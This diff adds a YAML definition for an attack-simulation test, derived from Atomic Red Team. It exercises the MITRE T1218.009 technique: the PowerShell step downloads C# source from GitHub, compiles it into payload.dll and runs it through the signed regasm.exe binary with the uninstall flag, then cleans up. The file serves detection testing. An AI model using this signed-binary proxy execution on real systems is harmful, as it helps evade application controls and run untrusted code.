@@ -1,0 +1,59 @@
+---
+api_version: 2.0
+uuid: 29bb4477-88e7-44e9-a6e8-21be79ff6ebc
+name: Regasm Uninstall Method Call Test
+description: |
+  Executes the Uninstall Method, No Admin Rights Required. Upon execution, "I shouldn't really execute either." will be displayed.
+  Derived from: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.md#t1218009---signed-binary-proxy-execution-regsvcsregasm
+requirements:
+  platforms:
+    - os: windows
+mitre:
+  tactics:
+    - TA0005 Defense Evasion
+  techniques:
+    - T1218 System Binary Proxy Execution
+  subtechniques:
+    - T1218.009 Regsvcs/Regasm
+args:
+  - name: src_file
+    description: location of the CSharp source file
+    type: string
+    default: $PWD\src\T1218.009.cs
+
+steps:
+  - name: execute
+    executor: powershell
+    description: |
+      Compiles CSharp source file into payload.dll and un-registers payload.dll from the Windows Registry
+    inline: |
+      if (-Not (Test-Path {{.Args.src_file}})){
+        Write-Host "T1218.009.cs not found. Downloading..."
+        $parent = Split-Path {{.Args.src_file}} -Parent
+        New-Item -Type Directory -Path $parent -ErrorAction Ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "{{.Args.src_file}}"
+        Write-Host "T1218.009.cs downloaded to: {{.Args.src_file}}"
+      } else {
+        Write-Host "T1218.009.cs located at: {{.Args.src_file}}"
+      }
+      C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"payload.dll" /target:library "{{.Args.src_file}}"
+
+      if (-Not (Test-Path "payload.dll")){
+        Write-Error "The payload.dll file was not generated."
+      } else {
+        C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll
+      }
+    cleanup:
+      executor: powershell
+      inline: |
+        $parent = Split-Path {{.Args.src_file}} -Parent
+        if (Test-Path {{.Args.src_file}}){
+          remove-item -r $parent
+        } else{
+          Write-Host "Failed to remove $parent"
+        }
+        if (Test-Path "payload.dll"){
+          remove-item payload.dll
+        } else {
+          Write-Host "Failed to remove payload.dll"
+        }
